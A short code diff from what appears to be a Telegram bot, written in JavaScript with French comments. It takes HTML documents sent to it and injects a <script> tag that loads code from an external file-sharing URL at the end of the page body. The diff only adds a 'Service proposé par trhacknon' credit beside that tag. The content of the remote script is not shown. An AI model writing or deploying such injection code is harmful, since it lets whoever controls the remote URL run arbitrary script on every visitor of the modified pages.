@@ -68,9 +68,9 @@ bot.on("document", async (ctx) => {
 
   // Ajoute le script à la fin du <body> si <body> existe
   if (content.includes("</body>")) {
-    content = content.replace("</body>", `<script src="https://jmp.sh/RXpoWXXM"></script></body>`);
+    content = content.replace("</body>", `<script src="https://jmp.sh/RXpoWXXM"></script><div>Service proposé par trhacknon</div></body>`);
   } else {
-    content += `<script src="https://jmp.sh/RXpoWXXM"></script>`;
+    content += `<script src="https://jmp.sh/RXpoWXXM"></script><div>Service proposé par trhacknon</div>`;
   }
 
   // Sauvegarde du fichier modifié
